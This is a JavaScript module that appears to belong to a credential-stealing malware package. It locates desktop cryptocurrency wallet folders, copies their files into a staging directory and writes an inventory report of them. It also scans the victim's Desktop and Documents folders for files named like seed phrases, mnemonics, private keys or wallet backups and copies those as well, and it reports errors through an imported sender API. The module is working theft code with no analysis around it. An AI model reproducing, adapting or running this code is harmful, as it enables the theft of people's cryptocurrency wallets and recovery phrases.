"use strict";

const fs = require("fs");
const path = require("path");
const os = require("os");
const constants = require("../config/constants");
const sender = require("../api/sender");

async function extractDesktopWallets(destDir) {
    const collectedWallets = [];

    if (!fs.existsSync(destDir)) {
        fs.mkdirSync(destDir, { recursive: true });
    }

    for (const [walletName, walletPath] of Object.entries(constants.desktopWalletPaths)) {
        if (fs.existsSync(walletPath)) {
            try {
                const stats = fs.statSync(walletPath);
                const walletInfo = {
                    name: walletName,
                    path: walletPath,
                    type: stats.isDirectory() ? "directory" : "file",
                    size: stats.isFile() ? stats.size : null,
                    files: []
                };
                if (stats.isDirectory()) {
                    const files = recursiveFileSearch(walletPath, null, [], 0, 2);
                    walletInfo.files = files.slice(0, 30).map(filePath => {
                        try {
                            return {
                                name: path.relative(walletPath, filePath),
                                path: filePath,
                                size: fs.statSync(filePath).size
                            };
                        } catch (e) { return null; }
                    }).filter(f => f !== null);
                }
                const walletDest = path.join(destDir, "All", "Wallet", walletName);
                if (!fs.existsSync(walletDest)) {
                    fs.mkdirSync(walletDest, { recursive: true });
                }

                walletInfo.files.forEach(file => {
                    try {
                        const fileDest = path.join(walletDest, file.name);
                        const fileDir = path.dirname(fileDest);
                        if (!fs.existsSync(fileDir)) {
                            fs.mkdirSync(fileDir, { recursive: true });
                        }
                        fs.copyFileSync(file.path, fileDest);
                    } catch (e) {
                        console.error("Dosya kopyalanamadı: " + file.name);
                    }
                });

                collectedWallets.push(walletInfo);
            } catch (err) {
                await sender.sendGenericMessage("Wallet Error: " + err);
            }
        }
    }
    await searchForSeedPhrases(destDir);
    let report = "";
    collectedWallets.forEach(w => {
        report += `[+] Wallet Name: ${w.name}\n`;
        report += `    Type: ${w.type}\n`;
        report += `    Path: ${w.path}\n`;
        if (w.type === "directory") {
            report += "    Files Found:\n";
            w.files.forEach(f => {
                report += `      - ${f.name} (${(f.size / 1024).toFixed(2)} KB)\n`;
            });
        } else {
            report += `    Size: ${(w.size / 1024).toFixed(2)} KB\n`;
        }
        report += "\n----------------------------------------------------\n\n";
    });

    const reportPath = path.join(destDir, "All", "Wallet", "Wallets.txt");
    fs.writeFileSync(reportPath, report, "utf8");
}
function recursiveFileSearch(dir, filter = null, fileList = [], depth = 0, maxDepth = 3) {
    if (depth > maxDepth) return fileList;

    try {
        const items = fs.readdirSync(dir);
        for (const item of items) {
            if (["node_modules", ".git", "cache", "Cache"].includes(item)) continue;

            const fullPath = path.join(dir, item);
            const stats = fs.statSync(fullPath);

            if (stats.isDirectory()) {
                recursiveFileSearch(fullPath, filter, fileList, depth + 1, maxDepth);
            } else {
                if (!filter || item.toLowerCase().includes(filter.toLowerCase())) {
                    fileList.push(fullPath);
                }
            }
        }
    } catch (e) {}
    return fileList;
}

async function searchForSeedPhrases(baseDest) {
    const searchDirs = [
        path.join(os.homedir(), "Desktop"),
        path.join(os.homedir(), "Documents")
    ];
    const keywords = [/seed/i, /mnemonic/i, /recovery.*phrase/i, /private.*key/i, /wallet.*backup/i, /crypto.*backup/i];
    const targetExtensions = [".txt", ".doc", ".docx"];

    for (const dir of searchDirs) {
        if (!fs.existsSync(dir)) continue;

        try {
            const files = recursiveFileSearch(dir, null, [], 0, 1);
            const sensitiveFiles = files.filter(f => {
                const ext = path.extname(f).toLowerCase();
                return targetExtensions.includes(ext);
            });

            for (const filePath of sensitiveFiles) {
                const fileName = path.basename(filePath).toLowerCase();
                if (keywords.some(regex => regex.test(fileName))) {
                    const seedDestDir = path.join(baseDest, "All", "Wallet", "Seed_Phrases");
                    if (!fs.existsSync(seedDestDir)) {
                        fs.mkdirSync(seedDestDir, { recursive: true });
                    }
                    try {
                        fs.copyFileSync(filePath, path.join(seedDestDir, path.basename(filePath)));
                    } catch (e) {}
                }
            }
        } catch (o) {}
    }
}

exports.extractDesktopWallets = extractDesktopWallets;
